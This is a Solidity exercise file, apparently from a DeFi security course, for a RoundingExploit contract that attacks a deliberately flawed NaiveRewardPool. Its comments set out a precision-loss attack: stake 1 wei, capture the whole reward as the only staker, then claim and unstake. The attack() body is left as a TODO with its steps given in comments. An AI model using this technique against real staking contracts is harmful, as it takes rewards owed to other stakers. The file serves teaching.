// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {NaiveRewardPool} from "./NaiveRewardPool.sol";

// ============================================================================
//  EXERCISE: RoundingExploit — Exploit the Precision Loss Vulnerability
// ============================================================================
//
//  NaiveRewardPool has a precision loss bug: when totalStaked is large,
//  `rewardAmount / totalStaked` truncates to 0 and rewards are silently lost.
//
//  But here's the exploit: if YOU are the only staker with a very small stake,
//  the division does NOT truncate — you capture the full reward. Then rewards
//  meant for later (larger) stakers get truncated to 0.
//
//  Attack strategy:
//    1. Stake a tiny amount (e.g., 1 wei) — you're the only staker
//    2. Trigger reward distribution — rewardPerToken = reward / 1 = reward
//       (no truncation because totalStaked = 1)
//    3. Claim your reward — you captured 100% of it
//    4. Unstake
//
//  The test will verify that:
//    - You captured rewards disproportionate to your stake size
//    - After other users stake, subsequent rewards truncate to 0
//
//  Run:
//    forge test --match-contract PrecisionLossTest -vvv
//
// ============================================================================

/// @notice Exploit contract for the precision loss vulnerability.
/// @dev Exercise for Module 8: DeFi Security (Precision Loss).
///      Student implements: attack().
///      Pre-built: constructor.
contract RoundingExploit {
    NaiveRewardPool public pool;
    IERC20 public stakingToken;
    IERC20 public rewardToken;

    constructor(NaiveRewardPool pool_, IERC20 stakingToken_, IERC20 rewardToken_) {
        pool = pool_;
        stakingToken = stakingToken_;
        rewardToken = rewardToken_;
    }

    // =============================================================
    //  TODO: Implement attack — stake a tiny amount to set up the exploit
    // =============================================================
    /// @notice Stake a tiny amount so you're the only staker when rewards arrive.
    /// @param stakeAmount The tiny amount to stake (e.g., 1 wei).
    /// @dev Steps:
    ///   1. Approve the pool to spend stakingToken:
    ///      stakingToken.approve(address(pool), stakeAmount);
    ///
    ///   2. Stake the tiny amount:
    ///      pool.stake(stakeAmount);
    ///
    /// That's all attack() does — just stake. The test then calls
    /// notifyReward() (distributing rewards while you're the only staker),
    /// then calls claimAndUnstake() to collect your reward.
    ///
    /// Why this works:
    ///   With stakeAmount = 1, rewardPerToken = rewardAmount / 1 = rewardAmount.
    ///   You capture the entire reward despite staking just 1 wei.
    ///
    /// See: Module 8 — "Precision Loss and Rounding Exploits"
    function attack(uint256 stakeAmount) external {
        // TODO: implement
    }

    /// @notice Claim rewards from the pool (called by test after notifyReward).
    function claimAndUnstake() external {
        pool.claimReward();
        uint256 stakedAmount = pool.staked(address(this));
        if (stakedAmount > 0) {
            pool.unstake(stakedAmount);
        }
    }
}
